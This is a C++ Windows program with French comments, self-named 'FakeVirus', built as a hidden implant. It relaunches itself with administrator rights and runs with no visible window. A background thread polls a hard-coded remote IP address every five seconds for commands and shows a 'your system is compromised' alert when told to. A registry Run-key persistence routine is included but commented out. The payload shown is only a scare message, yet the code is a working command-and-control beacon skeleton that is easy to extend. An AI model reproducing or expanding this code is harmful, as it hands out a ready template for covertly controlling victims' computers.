#include <windows.h>
#include <wininet.h>
#include <tchar.h>
#include <thread>
#include <chrono>
#include <string>

using namespace std;

// Lier avec la bibliothèque wininet.lib
#pragma comment(lib, "wininet.lib")

void RequestAdminPrivileges() {
    // Vérifie si le programme tourne déjà en mode admin
    BOOL isAdmin = FALSE;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID pAdminGroup;
    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdminGroup)) {
        CheckTokenMembership(NULL, pAdminGroup, &isAdmin);
        FreeSid(pAdminGroup);
    }

    if (!isAdmin) {
        // Relance le programme avec les droits admin
        TCHAR szPath[MAX_PATH];
        GetModuleFileName(NULL, szPath, MAX_PATH);

        SHELLEXECUTEINFO sei = { sizeof(sei) };
        sei.lpVerb = TEXT("runas");  // Demande les droits administrateur
        sei.lpFile = szPath;
        sei.hwnd = NULL;
        sei.nShow = SW_SHOWDEFAULT;
        sei.fMask = SEE_MASK_NOCLOSEPROCESS;

        if (!ShellExecuteEx(&sei)) {
            MessageBox(NULL, TEXT("Échec de l'obtention des droits administrateur !"), TEXT("Erreur"), MB_OK);
            exit(1);
        }
        exit(0);
    }
}

// Ajoute le programme au démarrage en écrivant dans le registre.
/*
void AddToStartup() {
    HKEY hKey;
    // Ouvre la clé de registre Run de l'utilisateur courant.
    LONG result = RegOpenKeyEx(HKEY_CURRENT_USER,
        TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
        0, KEY_WRITE, &hKey);
    if (result == ERROR_SUCCESS) {
        TCHAR szPath[MAX_PATH];
        // Récupère le chemin complet du programme en cours d'exécution.
        GetModuleFileName(NULL, szPath, MAX_PATH);
        // Écrit une nouvelle entrée "FakeVirus" dans la clé de registre.
        RegSetValueEx(hKey, TEXT("fi.sh_"), 0, REG_SZ,
            reinterpret_cast<const BYTE*>(szPath),
            (lstrlen(szPath) + 1) * sizeof(TCHAR));
        RegCloseKey(hKey);
    }
}
*/

// Affiche une boîte de dialogue d'alerte.
void ShowMessage() {
    MessageBox(NULL, TEXT("Votre système est compromis !"), TEXT("Alerte"), MB_OK);
}

// Effectue une requête HTTP GET pour récupérer une commande depuis un serveur distant.
string GetCommand() {
    string command;
    // Ouvre une session Internet.
    HINTERNET hInternet = InternetOpenA("FakeVirusAgent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet) {
        // Ouvre l'URL spécifiée.
        HINTERNET hConnect = InternetOpenUrlA(hInternet, "http://45.90.160.149:5000/command", NULL, 0, INTERNET_FLAG_RELOAD, 0);
        if (hConnect) {
            char buffer[256];
            DWORD bytesRead = 0;
            // Lit la réponse du serveur.
            if (InternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
                buffer[bytesRead] = '\0';
                command = buffer;
            }
            InternetCloseHandle(hConnect);
        }
        InternetCloseHandle(hInternet);
    }
    return command;
}

// Thread qui interroge périodiquement le serveur pour vérifier la commande.
void ListenForCommand() {
    while (true) {
        string cmd = GetCommand();
        // Si la commande contient le mot "show", afficher le message.
        if (cmd.find("show") != string::npos) {
            ShowMessage();
        }
        // Pause de 5 secondes avant la prochaine requête.
        this_thread::sleep_for(chrono::seconds(5));
    }
}

// Point d'entrée de l'application Windows (aucune console ne sera affichée)
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Ajoute l'exécutable au démarrage.
    /*
    AddToStartup();
    */

    // Lance le thread qui écoute les commandes distantes.
    thread listener(ListenForCommand);
    listener.detach(); // Détache le thread pour qu'il fonctionne en arrière-plan.

    // Boucle principale pour maintenir l'application en exécution.
    while (true) {
        this_thread::sleep_for(chrono::seconds(60));
    }

    return 0;
}
